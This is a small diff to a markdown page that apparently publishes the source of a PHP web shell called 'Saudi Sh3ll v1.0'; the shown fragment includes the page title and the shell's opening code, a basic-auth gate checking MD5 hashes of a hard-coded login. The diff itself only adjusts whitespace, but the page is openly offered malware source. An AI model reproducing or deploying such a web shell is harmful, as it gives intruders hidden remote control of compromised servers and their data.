@@ -13,6 +13,7 @@ tags:
 ---
 Saudi Sh3ll v1.0, by al-swisre
 
+
 ## Saudi Sh3ll v1.0 Source Code
 
 <pre class="brush: php; title: ; notranslate" title="">&lt;?
@@ -30,7 +31,7 @@ ob_start();
 
 
 $auth = 1;
-$name='ec371748dc2da624b35a4f8f685dd122'; // Saudi 
+$name='ec371748dc2da624b35a4f8f685dd122'; // Saudi
 $pass='ec371748dc2da624b35a4f8f685dd122'; // Saudi
 if($auth == 1) {
 if (!isset($_SERVER['PHP_AUTH_USER']) || md5($_SERVER['PHP_AUTH_USER'])!==$name || md5($_SERVER['PHP_AUTH_PW'])!==$pass)
